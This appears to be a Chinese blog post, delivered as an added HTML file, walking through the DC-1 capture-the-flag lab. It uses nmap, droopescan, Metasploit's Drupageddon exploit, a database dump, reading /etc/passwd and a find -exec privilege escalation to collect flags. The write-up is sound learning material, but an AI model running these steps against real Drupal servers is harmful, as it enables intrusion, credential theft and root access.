@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.2',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":null},
+    back2top: {"enable":true,"sidebar":true,"scrollpercent":true},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="软件综合训练第二天….">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防夺旗DC1">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;index.html">
+<meta property="og:site_name" content="ZhangFan&#39;s Blog">
+<meta property="og:description" content="软件综合训练第二天….">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;1.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;2.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;3.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;4.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;5.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;6.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;7.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;8.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;9.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;10.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;11.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;12.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;13.png">
+<meta property="og:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;14.png">
+<meta property="og:updated_time" content="2019-09-11T14:41:51.838Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;09&#x2F;11&#x2F;hacker-2&#x2F;1.png">
+
+<link rel="canonical" href="http://yoursite.com/2019/09/11/hacker-2/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>攻防夺旗DC1 | ZhangFan's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZhangFan's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/11/hacker-2/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/touxiang.png">
+      <meta itemprop="name" content="流岚">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZhangFan's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          攻防夺旗DC1
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2019-09-11 18:03:21 / 修改时间：22:41:51" itemprop="dateCreated datePublished" datetime="2019-09-11T18:03:21+08:00">2019-09-11</time>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>软件综合训练第二天….<a id="more"></a></p>
+<p>1.<strong>扫描被攻击主机ip地址</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.73.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/11/hacker-2/1.png" alt="1.png"></p>
+<p>从结果发现，共有五台在线主机，IP末尾为.1、.2和.254位虚拟机VMware自带，而kali_linux的IP为192.168.73.131，因此我们要攻击的主机的ip为192.168.73.130。</p>
+<p>2.<strong>获取更多信息</strong>：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -Pn -sSV -A  -p- -T5 192.168.73.130</span><br></pre></td></tr></table></figure>
+
+<p>-Pn为了不同ping，因为知道主机已启动，-p-扫描所有端口，-sC用默认脚本，-sSV发现开放端口然后尝试使用bannergrabbing服务名称和版本信息，-A运行大量nmap脚本来识别操作系统并收集更多信息，比较激进，-T5用于扫描更快。-T3是nmap默认值，在此下可用于避免网络上的IDS（他们会延迟扫描）。ip地址段为kali_linxu所属网段。</p>
+<p><img src="/2019/09/11/hacker-2/2.png" alt="2.png"></p>
+<p>可以从结果看出，该服务器是一个web服务器，因为它开放了80端口，并且使用了Drupal的CMS进行搭建的网站。因此我们可以考虑利用Drupal的漏洞进行攻击，但是利用nmap仅仅只能得到其版本为7，不能更加精确，因此我们需要确定他更加具体的版本号。</p>
+<p>3.<strong>进一步扫描，确定drupal版本：</strong></p>
+<p>安装并使用droopescan对drupal 进行扫描：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/droope/droopescan.git</span><br><span class="line"><span class="built_in">cd</span> droopescan</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
+
+<p>使用方法：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./droopescan scan drupal -u dc1.com</span><br></pre></td></tr></table></figure>
+
+<p>比如现在我们要攻击的主机为192.168.73.130，则具体命令为：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./droopescan scan drupal -u 192.168.73.130</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<p><img src="/2019/09/11/hacker-2/3.png" alt="3.png"></p>
+<p>由结果我们发现，该网站所使用的drupal版本可能为7.22～7.26，因此存在Drupageddon漏洞</p>
+<p>（Drupageddon是Drupal版本7.32中暴露的漏洞。它允许远程代码执行和shell访问）</p>
+<p>4.<strong>利用Drupageddon</strong></p>
+<p>msf中已经内置该漏洞脚本，可以直接在msf中查找</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; search Drupal</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/11/hacker-2/4.png" alt="4.png"></p>
+<p>接下来就是要利用该脚本进行攻击了，攻击方法如下（在msfconsole下）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/http/drupal_drupageddon</span><br><span class="line"><span class="built_in">set</span> rhost 192.168.73.130</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>rhost参数为被攻击的主机ip地址。</p>
+<p><img src="/2019/09/11/hacker-2/5.png" alt="5.png"></p>
+<p>这样我们就获得了这个网站的控制权了，但却不是root用户，我们可以输入以下命令发现我们并没有获得全部的权限：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/11/hacker-2/6.png" alt="6.png"></p>
+<p>我们可以看到通过<code>whoami</code>命令得到的并不是root用户。</p>
+<p>5.<strong>Get Flag1 !</strong></p>
+<p>当我们获取到了被攻击主机的网站控制权后，我们可以试一试<code>ls</code>命令，发现该目录下有一个flag1.txt，我们找到了一个旗子！让我们打开来看看里面有什么提示呢！</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat flag1.txt</span><br></pre></td></tr></table></figure>
+
+<p>注意：一定要在meterpreter &gt; 提示符下，如果你跟着我的上一步输入了<code>shell</code>，那请先输入exit退出到<code>meterpreter &gt;</code></p>
+<p><img src="/2019/09/11/hacker-2/7.png" alt="7.png"></p>
+<p>我们可以看到第一条提示：Every good CMS needs a config file - and so do you.</p>
+<p>提示配置文件，谷歌得知在在sites/default/settings.php下。</p>
+<p>让我们打开配置文件看看都有什么内容呢…</p>
+<p><img src="/2019/09/11/hacker-2/8.png" alt="8.png"></p>
+<p>可以看到在第一行写着：flag2</p>
+<p>Brute force and dictionary attacks aren’t the</p>
+<ul>
+<li>only ways to gain access (and you WILL need access).</li>
+<li>What can you do with these credentials?</li>
+</ul>
+<p>同时获得数据库用户名密码（dbuser/R0ck3t)</p>
+<p>接下来让我们进入数据库，试着找找有没有下一个flag，进入数据库命令如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash")'</span></span><br><span class="line">mysql -u dbuser -p</span><br></pre></td></tr></table></figure>
+
+<p>之后要求你输入密码，密码上面已经得到了：R0ck3t</p>
+<p>之后输入：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use drupaldb;</span><br><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
+
+<p>这样就得到了加密后的admin密码，下面我们需要把数据库dump下来。</p>
+<p>6.<strong>把数据库dump下来：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -u dbuser -p drupaldb &gt; 1.sql</span><br></pre></td></tr></table></figure>
+
+<p>使用ls命令可以看到当前目录下存在1.sql文件。</p>
+<p><img src="/2019/09/11/hacker-2/9.png" alt="9.png"></p>
+<p>使用cat命令打开1.sql查找flag3，可以发现存在提示：search_dataset:flag3 special perms will help find the passwd but you ll need to exec that command to work out how to get what s in the shadow</p>
+<p>两个提示：一个find，一个passwd</p>
+<p>7.<strong>根据提示，寻找其余flag</strong></p>
+<p>因为passwd为配置文件，位于/etc/passwd，因此我们cd到/etc目录下查看passwd文件内容：</p>
+<p><img src="/2019/09/11/hacker-2/10.png" alt="10.png"></p>
+<p>我们可以发现passwd文件内容最后一行存在一个用户名为flag4，我们于是cd到flag4的用户目录/home/flag4下查看。</p>
+<p><img src="/2019/09/11/hacker-2/11.png" alt="11.png"></p>
+<p>我们发现该用户目录下有一个flag4.txt，于是我们继续用cat命令查看该文件内容。</p>
+<p><img src="/2019/09/11/hacker-2/12.png" alt="12.png"></p>
+<p>这个提示告诉我们最后一个flag在root目录下，我们可以利用和find相似的方法去寻找。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /root</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/11/hacker-2/13.png" alt="13.png"></p>
+<p>可以看到在/root目录下有最后一个flag，即thefinalflag.txt，但是我们并没有root用户权限，怎么才能查看到这个文件内容呢？</p>
+<p>我们可以利用find进行提权，直接使用以下命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /root/thefinalflag.txt -<span class="built_in">type</span> f -<span class="built_in">exec</span> cat <span class="string">'&#123;&#125;'</span> \;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/09/11/hacker-2/14.png" alt="14.png"></p>
+<p>好了，我们终于成功了！嘿嘿嘿！</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+                <a href="/2019/09/10/hacker-1/" rel="next" title="使用bettercap进行渗透测试">
+                  <i class="fa fa-chevron-left"></i> 使用bettercap进行渗透测试
+                </a>
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+                <a href="/2019/09/17/hacker-3/" rel="prev" title="DC4">
+                  DC4 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="site-author-image" itemprop="image" alt="流岚"
+    src="/images/touxiang.png">
+  <p class="site-author-name" itemprop="name">流岚</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">9</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/aestheticisma" title="GitHub &amp;rarr; https:&#x2F;&#x2F;github.com&#x2F;aestheticisma" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/5975330626" title="Weibo &amp;rarr; https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;5975330626" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">流岚</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> 强力驱动 v4.0.0
+  </div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">主题 – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.2
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script>
+<script src="/js/schemes/pisces.js"></script>
+<script src="/js/next-boot.js"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  <!-- 背景动画 -->
+<script type="text/javascript" src="/js/particle.js"></script>
+  <!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/click_love.js"></script>
+  <!--页面崩溃-->
+<script type="text/javascript" src="/js/crash_cheat.js"></script>
+</body>
+
+</html>
